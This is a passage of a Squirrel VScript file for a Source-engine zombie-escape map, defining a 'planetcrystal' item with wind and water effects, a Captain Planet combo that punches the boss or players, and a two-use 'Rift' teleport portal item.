										if(dirspeed < this.speed)t.SetVelocity(t.GetVelocity() + (this.pushdir * (this.speed - dirspeed)));
									}
									return -1;
								},
								function Run(){
									EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
									EntFireByHandle(self,"AddOutput","OnEndTouch !self:RunScriptCode:UnTouch();:0:-1",0.00,null,null);
									self.SetSize(::ITEMS.planetcrystal.trigmins,::ITEMS.planetcrystal.trigmaxs);
									self.SetSolid(3);
									::CenterBounds(self);
									self.SetCollisionGroup(10);
									AddThinkToEnt(self,"Think");
									EntFireByHandle(self,"Enable","",0.02,null,null);
									EntFireByHandle(self,"Disable","",::ITEMS.planetcrystal.wind_lifetime,null,null);
									EntFireByHandle(self,"Kill","",::ITEMS.planetcrystal.wind_lifetime+0.05,null,null);
										//::DrawBounds(self,::ITEMS.planetcrystal.wind_lifetime+2.05);
								}});
							
							
							
							/*
							//__CSS__ OOB trigger rotation is fucked (replacement logic with hardcoded mins/maxs):
							local pdir = button.GetAngles();
							local pfdir = ::AnglesToDir(pdir);
							pdir = ""+pdir.x.tostring()+" "+pdir.y.tostring()+" "+pdir.z.tostring();
							for(local pidx=1;pidx<3;pidx++)
							{
								local spawnpos = button.GetOrigin();		//hardcoded mins/maxs...
								spawnpos += (pfdir * (417*pidx));
								spawnpos -= (pfdir * 250);
								::Ent(spawnpos,button.GetAngles(),"trigger_push",{
										spawnflags = 1,
										speed = (0+::ITEMS.planetcrystal.wind_pushspeed),
										pushdir = pdir,
										spawnflags = 1,
										filtername = "filter_non_invincible_t",
										targetname = "i_planetcrystal_wind",
									},{
									function Run(){
											//EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
											EntFireByHandle(self,"AddOutput","OnEndTouch !activator:RunScriptCode:self.SetVelocity(Vector());:0:-1",0.00,null,null);
											EntFireByHandle(self,"AddOutput","OnEndTouch !activator:RunScriptCode:self.SetVelocity(Vector());:0.05:-1",0.00,null,null);
											EntFireByHandle(self,"AddOutput","OnEndTouch !activator:RunScriptCode:self.SetVelocity(Vector());:0.1:-1",0.00,null,null);
											EntFireByHandle(self,"AddOutput","OnEndTouch !activator:RunScriptCode:self.SetVelocity(Vector());:0.2:-1",0.00,null,null);
											EntFireByHandle(self,"AddOutput","OnEndTouch !activator:RunScriptCode:self.SetVelocity(Vector());:0.5:-1",0.00,null,null);
										EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
										EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
										self.SetSize(Vector(-200,-200,-200),Vector(200,200,200));		//hardcoded mins/maxs...
										EntFireByHandle(self,"Enable","",0.02,null,null);
										EntFireByHandle(self,"Disable","",::ITEMS.planetcrystal.wind_lifetime,null,null);
										EntFireByHandle(self,"Kill","",::ITEMS.planetcrystal.wind_lifetime+0.05,null,null);
										::DrawBounds(self,50);
									}});
							}
							*/
							
							
							
							
							
								
							
							//__CSS__ OOB trigger rotation is fucked (old logic):
								//NEW TRIGGER (v1_6 and newer):
							/*
							local pdir = button.GetAngles();
							pdir = ""+pdir.x.tostring()+" "+pdir.y.tostring()+" "+pdir.z.tostring();
							::Ent(button.GetOrigin(),button.GetAngles(),"trigger_push",{
									spawnflags = 1,
									speed = (0+::ITEMS.planetcrystal.wind_pushspeed),
									pushdir = pdir,
									spawnflags = 1,
									filtername = "filter_non_invincible_t",
									targetname = "i_planetcrystal_wind",
								},{
								function Run(){
										//EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
										EntFireByHandle(self,"AddOutput","OnEndTouch !activator:RunScriptCode:self.SetVelocity(Vector());:0:-1",0.00,null,null);
										EntFireByHandle(self,"AddOutput","OnEndTouch !activator:RunScriptCode:self.SetVelocity(Vector());:0.05:-1",0.00,null,null);
										EntFireByHandle(self,"AddOutput","OnEndTouch !activator:RunScriptCode:self.SetVelocity(Vector());:0.1:-1",0.00,null,null);
										EntFireByHandle(self,"AddOutput","OnEndTouch !activator:RunScriptCode:self.SetVelocity(Vector());:0.2:-1",0.00,null,null);
										EntFireByHandle(self,"AddOutput","OnEndTouch !activator:RunScriptCode:self.SetVelocity(Vector());:0.5:-1",0.00,null,null);
									EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
									EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
									EntFireByHandle(self,"AddOutput","mins "+::ITEMS.planetcrystal.trigmins,0.00,null,null);
									EntFireByHandle(self,"AddOutput","maxs "+::ITEMS.planetcrystal.trigmaxs,0.00,null,null);
									EntFireByHandle(self,"Enable","",0.02,null,null);
									EntFireByHandle(self,"Disable","",::ITEMS.planetcrystal.wind_lifetime,null,null);
									EntFireByHandle(self,"Kill","",::ITEMS.planetcrystal.wind_lifetime+0.05,null,null);
								}});
							*/
							
							
							::Sound("*ambient/wind/windgust.wav",button.GetOrigin(),null,10000,0.10,RandomInt(200,255),10);
							::Sound("*ambient/wind/windgust.wav",button.GetOrigin(),null,10000,0.10,RandomInt(220,255),10);
							::ITEMS.planetcrystal.SpawnCrystalEffect(button.GetOrigin(),button.GetAngles(),1);
									//OLD PRE-MODEL
								//for(local i=0;i<350;i+=120)
								//	::Particle("dust_jet_roof_dust_L",button.GetOrigin()+(button.GetForwardVector()*i)+
								//		Vector(0,0,-20),button.GetAngles()+Vector(0,-25,0),null,0.10);
						}
						else if(type==4)//-------------- water
						{
							::HurtStunBoss(	button.GetOrigin()+(button.GetForwardVector()*0)+Vector(0,0,100),
								::ITEMS.planetcrystal.water_bosshit_radius,::ITEMS.planetcrystal.water_bosshit_damage,
								::ITEMS.planetcrystal.water_bosshit_stunchance,::ITEMS.planetcrystal.water_bosshit_stuntime_add,null);
							for(local h;h=Entities.FindByNameWithin(h,"item_baguette",button.GetOrigin()+
							(button.GetForwardVector()*150),::ITEMS.baguette.watercrystal_range);)
							{
								if(h==null||!h.IsValid())continue;
								h.ValidateScriptScope();
								h.GetScriptScope().holder.GetScriptScope().logic.breakchance = (0.00+::ITEMS.baguette.watercrystal_chance_set);
								EntFireByHandle(h.GetScriptScope().holder.GetScriptScope().logic.model,"AddOutput","glowstyle 0",0.00,null,null);
								EntFireByHandle(h.GetScriptScope().holder.GetScriptScope().logic.model,"AddOutput","glowdist 500",0.00,null,null);
								local state = 0;
								for(local ii=00;ii<5.00;ii+=0.20)
								{
									state++;if(state>1)state=0;
									EntFireByHandle(h.GetScriptScope().holder.GetScriptScope().logic.model,"AddOutput","glowcolor 50 200 255",ii,null,null);
									EntFireByHandle(h.GetScriptScope().holder.GetScriptScope().logic.model,"AddOutput","glowenabled "+state.tostring(),ii,null,null);
								}
								EntFireByHandle(h.GetScriptScope().holder.GetScriptScope().logic.model,"AddOutput","glowenabled 0",5.30,null,null);
								EntFireByHandle(h.GetScriptScope().holder.GetScriptScope().logic.model,"AddOutput","glowstyle 1",5.30,null,null);
								EntFireByHandle(h.GetScriptScope().holder.GetScriptScope().logic.model,"AddOutput","glowcolor 100 50 0",5.30,null,null);
								EntFireByHandle(h.GetScriptScope().holder.GetScriptScope().logic.model,"AddOutput","glowdist 2000",5.30,null,null);
								//printl("::ITEMS.baguette - watercrystal HIT - breakchance set to: "+(0.00+::ITEMS.baguette.watercrystal_chance_set));
							}
							for(local h;h=Entities.FindByNameWithin(h,"item_dragonslayer",button.GetOrigin()+
							(button.GetForwardVector()*150),::ITEMS.dragonslayer.watercrystal_range);)
							{
								if(h==null||!h.IsValid())continue;
								h.ValidateScriptScope();
								h.GetScriptScope().holder.GetScriptScope().logic.bloodstack = (0.00+::ITEMS.dragonslayer.watercrystal_set);
								//printl("::ITEMS.dragonslayer - watercrystal HIT - bloodstack set to: "+(0.00+::ITEMS.dragonslayer.watercrystal_set));
							}
							
							
							
							
							
							//__CSS__ OOB trigger rotation is fucked (replacement logic):
							::TriggerScan(button.GetOrigin(),button.GetAngles(),::ITEMS.planetcrystal.trigmins,::ITEMS.planetcrystal.trigmaxs,
								"filter_non_invincible_t",{function Scanned(list){
									foreach(toucher in list)
									{
										if(toucher==null||!toucher.IsValid())return;
										toucher.ValidateScriptScope();
										if("invincible" in toucher.GetScriptScope())return;
											//NEW:
										EntFire("manager","RunScriptCode",
											" AddSpeed("+::ITEMS.planetcrystal.water_slowamount.tostring()+","+::ITEMS.planetcrystal.water_slowtime.tostring()+"); ",
											0.00,toucher);
										toucher.SetVelocity(Vector());
											//OLD:
										//for(local i=0.00;i<::ITEMS.planetcrystal.water_stoptime;i+=::ITEMS.planetcrystal.water_stoprate)
										//	EntFireByHandle(toucher,"RunScriptCode"," self.SetVelocity(Vector(0,0,self.GetVelocity().z)); ",i,null,null);
											//DebugDrawBoxAngles(self.GetOrigin(),self.GetBoundingMins(),self.GetBoundingMaxs(),self.GetAngles(),0,0,0,200,5.00);
									}
								}},false);
								
								
							
							//__CSS__ OOB trigger rotation is fucked (old logic):
							/*::Ent(button.GetOrigin(),button.GetAngles(),"trigger_multiple",{
									spawnflags = 1,
									filtername = "filter_non_invincible_t",
								},{
								function Touch(){
									local toucher = activator;	//__CSS__ activator may get reset, store toucher
									if(toucher==null||!toucher.IsValid())return;
									toucher.ValidateScriptScope();
									if("invincible" in toucher.GetScriptScope())return;
										//NEW:
									EntFire("manager","RunScriptCode",
										" AddSpeed("+::ITEMS.planetcrystal.water_slowamount.tostring()+","+::ITEMS.planetcrystal.water_slowtime.tostring()+"); ",
										0.00,toucher);
									toucher.SetVelocity(Vector());
										//OLD:
									//for(local i=0.00;i<::ITEMS.planetcrystal.water_stoptime;i+=::ITEMS.planetcrystal.water_stoprate)
									//	EntFireByHandle(toucher,"RunScriptCode"," self.SetVelocity(Vector(0,0,self.GetVelocity().z)); ",i,null,null);
										//DebugDrawBoxAngles(self.GetOrigin(),self.GetBoundingMins(),self.GetBoundingMaxs(),self.GetAngles(),0,0,0,200,5.00);
								},function Run(){
									EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
									EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
									EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
									EntFireByHandle(self,"AddOutput","mins "+::ITEMS.planetcrystal.trigmins,0.00,null,null);
									EntFireByHandle(self,"AddOutput","maxs "+::ITEMS.planetcrystal.trigmaxs,0.00,null,null);
									EntFireByHandle(self,"Enable","",0.05,null,null);
									EntFireByHandle(self,"Kill","",0.20,null,null);
								}});*/
							
							
							::Sound("*ambient/water/wave1.wav",button.GetOrigin(),null,10000,0.10,RandomInt(200,255),10);
							::Sound("*ambient/water/wave1.wav",button.GetOrigin(),null,10000,0.10,RandomInt(200,255),10);
							::Sound("*ambient/water_splash3.wav",button.GetOrigin(),null,10000,0.10,RandomInt(60,70),10);
							::ITEMS.planetcrystal.SpawnCrystalEffect(button.GetOrigin(),button.GetAngles(),2);
									//OLD PRE-MODEL
								//for(local i=40;i<500;i+=75)
								//	::Particle("explosion_basic_water",button.GetOrigin()+(button.GetForwardVector()*i)+Vector(0,0,-20),Vector(),null,0.10);
						}
						return true;
					}
				}},hammerid);
		},
		function TickCombo()
		{
			EntFire("manager","RunScriptCode"," ITEMS.planetcrystal.TickCombo(); ",combotickrate,null);
			combotime -= combotickrate;
			if(combotime<=0.00)ClearCombo();
		},
		function ClearCombo()
		{
			combotime = 0.00;
			combopos = null;
			combocurrent = 0;
		},
		function RegisterCombo(button,type)
		{
			if(!comboticking)
			{
				comboticking = true;
				EntFire("manager","RunScriptCode"," ITEMS.planetcrystal.TickCombo(); ",0.10,null);
			}
			if(type==1)//earth, starts/resets the combo
			{
				combocurrent = 1;
				combopos = button.GetOrigin();
				combotime = (0.00+combo_timeout);
			}
			else
			{
				if(combopos==null)ClearCombo();
				else if(type==(1+combocurrent) && ::GetDistance(combopos,button.GetOrigin())<=combo_distance)
				{
					combocurrent++;
					combotime = (0.00+combo_timeout);
					if(combocurrent >= 4)
					{
						SpawnCaptainPlanet(combopos);
						ClearCombo();
					}
				}
				else ClearCombo();
			}
		},
		function SpawnCrystalEffect(pos,rot,type,iterations=5)
		{
			//::manager.PrecacheModel("models/luffaren/planetcrystal_fx.mdl");
			local ipp = 0.02;
			local rendamt = 50;
			if(type==1)
			{
				rendamt = 100;
				ipp = (0+::ITEMS.planetcrystal.wind_fx_rate);
			}
			for(local i=0;i<iterations;i++)
			{
				local renda = (RandomInt(-20,50)+rendamt);
				::Ent(pos,rot+Vector(RandomFloat(-20,5),RandomFloat(-10,10),RandomFloat(0,360)),"prop_dynamic",{
						model = "models/luffaren/planetcrystal_fx.mdl",
						modelscale = RandomFloat(1.00,2.00),
						StartDisabled = 1,
						rendermode = 3,
						renderamt = renda,
						glowenabled = 1,
						glowdist = 10000,
						glowstyle = 1,
						glowcolor = "20 20 20",
					},{
					type = type,
					renda = renda,
					ipp = ipp,
					function Run(){
						EntFireByHandle(self,"AddOutput","body "+type.tostring(),0.00,null,null);
						EntFireByHandle(self,"Enable","",0.01,null,null);
						local ii = 0.00;
						for(local alpha=renda;alpha>0;alpha-=RandomInt(2,5))
						{
							EntFireByHandle(self,"AddOutput","renderamt "+alpha.tostring(),ii,null,null);
							EntFireByHandle(self,"RunScriptCode","self.SetOrigin(self.GetOrigin()+"+
							"Vector(RandomFloat(-5,5),RandomFloat(-5,5),RandomFloat(-5,5))+(self.GetForwardVector()*RandomFloat(-10.00,30.00)));",ii,null,null);
							ii += ipp;
						}
						EntFireByHandle(self,"Kill","",ii,null,null);
					}});
			}
		},
		function SpawnCaptainPlanet(pos)
		{
			::Ent(pos,Vector(0,RandomFloat(0,360),0),"prop_dynamic",{
					model="models/luffaren/captain_planet.mdl",
					rendermode = 1,
					modelscale = 1.00,
					StartDisabled = 1,
				},{
				stopfight = false,
				stoppedfight = false,
				cleanup = false,
				function StartSound(){
					::Sound("*luffaren/cplanet_goplanet.mp3",Vector(),null,0,30.00,100,5);
					for(local i=0;i<2;i++)
						::Sound("*luffaren/cplanet_goplanet.mp3",Vector(),self,100000,30.00,100,10);
				},function ThePowerIsYours(){
					for(local h;h=Entities.FindByClassname(h,"player");)
					{
						if(h==null||!h.IsValid()||h.IsAlive()==false||h.GetTeam()!=3||h.GetHealth()>::ITEMS.planetcrystal.captain_ct_hpbuff)continue;
						EntFireByHandle(h,"AddOutput","health "+::ITEMS.planetcrystal.captain_ct_hpbuff.tostring(),0.00,null,null);
					}
					local fade = Entities.CreateByClassname("env_fade");
					fade.__KeyValueFromFloat("duration",2.00);
					fade.__KeyValueFromFloat("ReverseFadeDuration",2.00);
					fade.__KeyValueFromFloat("holdtime",0.00);
					fade.__KeyValueFromInt("spawnflags",1);
					fade.__KeyValueFromVector("rendercolor",Vector(255,255,255));
					EntFireByHandle(fade,"AddOutput","renderamt 200",0.00,null,null);
					EntFireByHandle(fade,"Fade","",0.02,null,null);
					EntFireByHandle(fade,"Kill","",2.50,null,null);
				},function AssKickingTick(){
					if(cleanup)
					{
						EntFireByHandle(self,"AddOutput","glowenabled 0",0.00,null,null);
						EntFireByHandle(self,"AddOutput","glowdist 0",0.00,null,null);
						//EntFireByHandle(self,"fadeandkill","4",0.00,null,null);
						::FadeAndKill(self,4.00);		//__CSS__ fadeandkill doesn't exist in css
						EntFireByHandle(self,"Kill","",3.95,null,null);
						return;
					}
					EntFireByHandle(self,"RunScriptCode"," AssKickingTick(); ",::ITEMS.planetcrystal.captain_rate,null,null);
					if(stopfight)
					{
						if(stoppedfight)return;
						stoppedfight = true;
						EntFireByHandle(self,"SetAnimation","idle",0.00,null,null);
						EntFireByHandle(self,"SetDefaultAnimation","idle",0.01,null,null);
						self.SetAngles(0,self.GetAngles().y,self.GetAngles().z);
						return;
					}
					local animidx = RandomInt(1,5);
					EntFireByHandle(self,"SetAnimation","punching_"+animidx.tostring(),0.00,null,null);
					EntFireByHandle(self,"SetDefaultAnimation","punching_"+animidx.tostring(),0.01,null,null);
					local found_eye = null;
					if(::ITEMS.planetcrystal.captain_target_boss)
					{
						local eyecands = [];
						for(local h;h=Entities.FindByName(h,"boss_eye");)
						{
							if(h==null||!h.IsValid())continue;
							h.ValidateScriptScope();
							if(!("hitbox" in h.GetScriptScope()))continue;
							if(h.GetScriptScope().hitbox==null||!h.GetScriptScope().hitbox.IsValid())continue;
							eyecands.push(h);
						}
						if(eyecands.len()>0)found_eye = eyecands[RandomInt(0,eyecands.len()-1)];
					}
					if(found_eye != null)
					{
						EntFireByHandle(found_eye.GetScriptScope().hitbox,"RemoveHealth",::ITEMS.planetcrystal.captain_boss_damage.tostring(),0.00,null,null);
						local newdir = Vector(RandomFloat(-1.00,1.00),RandomFloat(-1.00,1.00),RandomFloat(-0.50,-1.00));
						newdir.Norm();
						self.SetOrigin(found_eye.GetOrigin()-(newdir*RandomFloat(100,200)));
						self.SetForwardVector(newdir);
						for(local i=0.00;i<0.25;i+=0.12)
						{
							EntFireByHandle(found_eye,"RunScriptCode",
								" ::Sound(\"*luffaren/punch.mp3\",self.GetOrigin(),null,RandomInt(500,20000),0.05,RandomInt(70,130),10); ",i,null,null);
							EntFireByHandle(found_eye,"RunScriptCode",
								" ::Particle(\"muzzle_rifles\",self.GetOrigin()+Vector(RandomInt(-30,30),RandomInt(-30,30),RandomInt(30,50)),Vector(),null,0.10); ",i,null,null);
						}
						::Particle("blood_spurt_synth_01",found_eye.GetOrigin()-(newdir*RandomFloat(10,50))+Vector(0,0,40),self.GetAngles(),null,0.10);
						::Particle("blood_advisor_puncture_withdraw",found_eye.GetOrigin()+Vector(RandomInt(-10,10),RandomInt(-10,10),RandomInt(30,50)),
							self.GetAngles()+Vector(45,180,0),null,0.10);
					}
					else
					{
						local candidates = [];
						for(local h;h=Entities.FindByClassname(h,"player");)
						{
							if(h==null||!h.IsValid()||h.IsAlive()==false||h.GetTeam()!=2||h.GetOrigin().z < -13500)continue;
							h.ValidateScriptScope();
							if("invincible" in h.GetScriptScope())continue;
							candidates.push(h);
						}
						if(candidates.len()<=0)return;
						local victim = candidates[RandomInt(0,candidates.len()-1)];
						local newdir = Vector(RandomFloat(-1.00,1.00),RandomFloat(-1.00,1.00),RandomFloat(-0.50,-1.00));
						newdir.Norm();
						self.SetOrigin(victim.GetOrigin()-(newdir*RandomFloat(50,100)));
						self.SetForwardVector(newdir);
						victim.SetVelocity(Vector(0,0,::ITEMS.planetcrystal.captain_smash_upvel));
						EntFireByHandle(victim,"RunScriptCode"," self.SetVelocity(Vector(0,0,-::ITEMS.planetcrystal.captain_smash_downvel)); ",
							::ITEMS.planetcrystal.captain_smash_downdelay,null,null);
						local newhp = victim.GetHealth()-::ITEMS.planetcrystal.captain_damage;
						if(newhp>0)victim.SetHealth(newhp);
						else EntFireByHandle(victim,"SetHealth","-69",0.00,null,null);
						for(local i=0.00;i<0.25;i+=0.12)
						{
							EntFireByHandle(victim,"RunScriptCode",
								" ::Sound(\"*luffaren/punch.mp3\",self.GetOrigin(),null,RandomInt(500,20000),0.05,RandomInt(70,130),10); ",i,null,null);
							EntFireByHandle(victim,"RunScriptCode",
								" ::Particle(\"muzzle_rifles\",self.GetOrigin()+Vector(RandomInt(-30,30),RandomInt(-30,30),RandomInt(30,50)),Vector(),null,0.10); ",i,null,null);
						}
						::Particle("blood_spurt_synth_01",victim.GetOrigin()-(newdir*RandomFloat(10,50))+Vector(0,0,40),self.GetAngles(),null,0.10);
						::Particle("blood_advisor_puncture_withdraw",victim.GetOrigin()+Vector(RandomInt(-10,10),RandomInt(-10,10),RandomInt(30,50)),
							self.GetAngles()+Vector(45,180,0),null,0.10);
					}
				},function ShowTheCaptain(){
					::Particle("water_splash_01_refract",self.GetOrigin()+Vector(0,0,50),Vector(),null,0.10);
					::Particle("smoke_exhaust_01",self.GetOrigin()+Vector(0,0,50),Vector(),null,0.10);	//aztec_copter_takeoff_grass
					::Particle("explosion_huge_d",self.GetOrigin()+Vector(0,0,50),Vector(),null,0.10);
					::Particle("blood_spurt_synth_01",self.GetOrigin()+Vector(0,0,50),Vector(),null,0.10);
					::Particle("blood_impact_synth_01_droplets",self.GetOrigin()+Vector(0,0,50),Vector(),null,0.10);
				},function Run(){
					EntFireByHandle(self,"RunScriptCode"," ShowTheCaptain(); ",0.82,null,null);
					EntFireByHandle(self,"AddOutput","glowenabled 1",0.81,null,null);
					EntFireByHandle(self,"AddOutput","glowdist 10000",0.81,null,null);
					EntFireByHandle(self,"AddOutput","glowstyle 1",0.81,null,null);
					EntFireByHandle(self,"AddOutput","glowcolor 20 60 100",0.81,null,null);
					EntFireByHandle(self,"Enable","",0.82,null,null);
					EntFireByHandle(self,"SetAnimation","idle",0.00,null,null);
					EntFireByHandle(self,"SetDefaultAnimation","idle",0.01,null,null);
					EntFireByHandle(self,"RunScriptCode"," StartSound(); ",0.82,null,null);
					EntFireByHandle(self,"RunScriptCode"," AssKickingTick(); ",6.00,null,null);
					EntFireByHandle(self,"RunScriptCode"," ThePowerIsYours(); ",26.15,null,null);
					EntFireByHandle(self,"RunScriptCode"," stopfight = true; ",24.00,null,null);
					EntFireByHandle(self,"RunScriptCode"," cleanup = true; ",27.50,null,null);
					::Ent(self.GetOrigin(),Vector(),"env_spritetrail",{
							lifetime = 1.00,
							startwidth = 64,
							endwidth = 0.1,
							rendermode = 5,
							rendercolor = "0 200 255",
							renderamt = 255,
							spritename = "sprites/physbeam.vmt",
						},{
						model = self,
						function Run(){
							EntFireByHandle(self,"SetScale","1.00",0.60,null,null);
							EntFireByHandle(self,"ShowSprite","",0.50,null,null);
							EntFireByHandle(self,"SetParent","!activator",1.00,model,null);
						}});
				}});
		}
	},
	rift = {
			team = 3,
			hammerid = 6,	//example: 1 (range 1-999)
			killtime = 100.00,			//this will lock button/kill TP's after this time after FIRST use!!!
			killtime_timeout = 200.00,	//if some shit bugs out, just safely kill via this no matter what
			fall_forgive_time = 1.00,	//null:disable, else when a player teleports, wait this time to determine if a player is falling or not (if so, TP back again safely)
			fall_forgive_vel = 300,		//if the downwards-fall-velocity of the player is more than this during the forgiveness-check, TP back safely^
		function Spawn(pos,ct_t=true){
			local weptype = 1;
			local name = "Rift";
			
			
			
			local description = "(1x)\nCreate a shortcut portal\n"+
								"1st use: entry (big)\n"+
								"2nd use: destination (small)\n"+
								"Lasts "+killtime.tostring()+"s from 1st use / Z-touch\n"+
								"TP may be blocked in some spots";
			if(!ct_t)
			{
				weptype = 3;
				name = "RiftZ";
				description = 	"(1x)\nCreate a shortcut portal\n"+
								"1st use: destination (small)\n"+
								"2nd use: entry (big)\n"+
								"Lasts "+killtime.tostring()+"s from 1st use\n"+
								"TP may be blocked in some spots";
			}
			//__CSS__ game_text char limit, old below(v), new above(^)
			/*
			local description = "(1x)\nCreate a shortcut portal\n"+
								"1st use: create entry portal (big)\n"+
								"2nd use: create destination portal (small)\n"+
								"Portal clears "+killtime.tostring()+"s from 1st use / Z-touch\n"+
								"Use it to help your defenders get back safely\n2nd use cannot be used over gaps";
			if(!ct_t)
			{
				weptype = 3;
				name = "RiftZ";
				description = 	"(1x)\nCreate a shortcut portal\n"+
								"1st use: create destination portal (small)\n"+
								"2nd use: create entry portal (big)\n"+
								"Portal clears "+killtime.tostring()+"s from 1st use\n"+
								"Use it to help your zombie teammates ahead\n1st use cannot be used over gaps\n"+
								"Entry becomes locked when too close to main-TP";
			}
			*/
			
			
			::CreateItem(pos,Vector(),weptype,name,description,{
				model1 = null,
				model2 = null,
				tp1 = null,
				tp2 = null,
				tp_pos = null,
				use_count = 1,
				but = null,
				cleaned = false,
				ct_t = ct_t,
				function PlacedOutFullyKill()
				{
					if(cleaned)return;
					cleaned = true;
					if(tp1!=null)EntFireByHandle(tp1,"FireUser1","",0.00,null,null);
					if(tp2!=null)EntFireByHandle(tp2,"FireUser1","",0.00,null,null);
					if(but==null||!but.IsValid()){}
					else
					{
						but.GetScriptScope().cooldown = null;
						EntFireByHandle(but,"Kill","",0.00,null,null);
					}
				},function Act(holder,button,user,event)
				{
					if(event==1)//initialize
					{
						::CreateCostCleaner(button,3);
						::CreateTemCleaner(holder,{
							holder=holder,
							function Clean(){
								EntFireByHandle(holder,"Kill","",0.00,null,null);
							}});
						but = button;
						//button.PrecacheModel("models/luffaren/rift.mdl");
						for(local i=0;i<2;i++)
						{
							local lv = 4;
							if(i==1)lv = -4;
							::Ent(button.GetOrigin()+(button.GetLeftVector()*lv)+Vector(0,0,-30)-(button.GetForwardVector()*6),
								button.GetAngles()+Vector(0,110,0),"prop_dynamic",{
									model="models/luffaren/rift.mdl",
									modelscale = 0.90,
									rendermode = 1,
									glowenabled = 1,
									glowstyle = 3,
									glowdist = 5000,
									glowcolor = Vector(255,255,255),
								},{
								button = button,
								logic=this,
								i=i,
								function Run(){
									if(i==1)logic.model1 = self;
									else logic.model2 = self;
									EntFireByHandle(self,"SetParent","!activator",0.00,button,null);
								}});
						}
					}
					//else if(event==2){}//pickup
					//else if(event==3){}//drop
					//else if(event==4){}//use_failed
					else if(event==5)//use
					{
						if(ct_t && ::ITEMS.squid.PlayerInked(user))return;
						if(::GetDistance(user.EyePosition(),user.GetOrigin()) < 60)return;		//can't be crouched
						button.GetScriptScope().cooldown = 1.00;
						local spos = user.GetOrigin()+Vector(0,0,64);
						if(ct_t)
						{
							if(use_count==1)
							{
								EntFireByHandle(model1,"Kill","",0.00,null,null);
								tp_pos = user.GetOrigin()+Vector(0,0,3);
								spos = tp_pos+Vector(0,0,61);
								EntFireByHandle(holder,"RunScriptCode"," logic.PlacedOutFullyKill(); ",::ITEMS.rift.killtime,null,null);
								::ITEMS.rift.SpawnRift(spos,null,::ITEMS.rift.killtime_timeout,this,null,ct_t,user);
								use_count++;
								::PlayerNameMessage(user,""," used Rift (entry)",0.00);
							}
							else
							{
								spos = spos+Vector(0,0,0);
								tp_pos = user.GetOrigin()+Vector(0,0,3);
								if(::GetDistance(tp2.GetOrigin(),spos)<60)return false;
								if(TraceLinePlayersIncluded(tp_pos,tp_pos+Vector(0,0,-40),user)==1.00)return false;
								EntFireByHandle(model2,"Kill","",0.00,null,null);
								button.GetScriptScope().cooldown = null;
								::ITEMS.rift.SpawnRift(spos,tp_pos,::ITEMS.rift.killtime_timeout,this,null,ct_t);
								use_count++;
								::PlayerNameMessage(user,""," used Rift (exit)",0.00);
								EntFireByHandle(button,"Kill","",0.10,null,null);
							}
						}
						else
						{
							if(use_count==1)
							{
								tp_pos = user.GetOrigin()+Vector(0,0,3);
								spos = tp_pos+Vector(0,0,61);
								if(TraceLinePlayersIncluded(tp_pos,tp_pos+Vector(0,0,-40),user)==1.00)return false;
								EntFireByHandle(model1,"Kill","",0.00,null,null);
								EntFireByHandle(holder,"RunScriptCode"," logic.PlacedOutFullyKill(); ",::ITEMS.rift.killtime,null,null);
								::ITEMS.rift.SpawnRift(spos,null,::ITEMS.rift.killtime_timeout,this,null,ct_t);
								use_count++;
							}
							else
							{
								spos = spos+Vector(0,0,0);
								tp_pos = user.GetOrigin()+Vector(0,0,3);
								if(::GetDistance(tp1.GetOrigin(),spos)<60)return false;
								EntFireByHandle(model2,"Kill","",0.00,null,null);
								button.GetScriptScope().cooldown = null;
								::ITEMS.rift.SpawnRift(spos,tp_pos,::ITEMS.rift.killtime_timeout,this,null,ct_t);
								use_count++;
								EntFireByHandle(button,"Kill","",0.10,null,null);
							}
						}
						return true;
					}
				}},hammerid);
		},
		function SpawnRift(pos,tp_pos=null,cleantime=null,logic=null,invincibility_time=null,ct_t=true,targetplayer=null)
		{
			local col_ready = "0 150 255";
			local col_notready = "255 0 0";
			if(!ct_t)
			{
				col_ready = "200 100 0";
				col_notready = "255 0 255";
			}
			//::manager.PrecacheModel("models/luffaren/rift.mdl");
			::Ent(pos,Vector(0,RandomInt(0,360),0),"prop_dynamic",{
					model="models/luffaren/rift.mdl",
					rendermode = 1,		//__CSS__ original is 1, but it cuts stuff behind off entirely it seems?
					modelscale = 0.10,
					skin = 1,
				},{
				logic=logic,
				tp_pos=tp_pos,
				scale = 0.10,
				target_scale = 3.00,		//__CSS__ original was 9.00, but that was HUGE
				cleantime=cleantime,
				invincibility_time=invincibility_time,
				redindicator=null,
				ct_t = ct_t,
				col_ready = col_ready,
				col_notready = col_notready,
				targetplayer = targetplayer,
				targetindicator = null,
				function Tick()
				{
					if(scale>=target_scale)
					{
						scale = 0.00+target_scale;
						//self.__KeyValueFromFloat("modelscale",scale);
						::NetProps.SetPropFloat(self,"m_flModelScale",scale);
						return;
					}
					EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.02,null,null);
					scale += 0.15;
					//self.__KeyValueFromFloat("modelscale",scale);
					::NetProps.SetPropFloat(self,"m_flModelScale",scale);
				},function Run(){
					if(!("mhandles" in logic))logic.mhandles <- [];
					logic.mhandles.push(self);
					logic._is_ready <- false;
					EntFireByHandle(self,"AddOutput","OnUser1 !self:Kill::0:1",0.00,null,null);
					if(cleantime!=null)EntFireByHandle(self,"FireUser1","",cleantime,null,null);
					EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.00,null,null);
					::Sound("*luffaren/rift_spawn.mp3",self.GetOrigin(),null,10000,0.05,RandomInt(90,110),10);
					::Particle("water_impact_bubbles_1",self.GetOrigin(),Vector(),null,0.05);
					if(ct_t && tp_pos==null || !ct_t && tp_pos!=null)
					{
						local indcol = ""+col_notready;		//__CSS__ no glow exists
						//logic._is_ready <- false;
						if(ct_t)
						{
							if(logic!=null)logic.tp2 = self;
						}
						else
						{
							if(logic!=null)logic.tp2 = self;
							tp_pos = logic.tp1.GetOrigin()+Vector(0,0,-61);
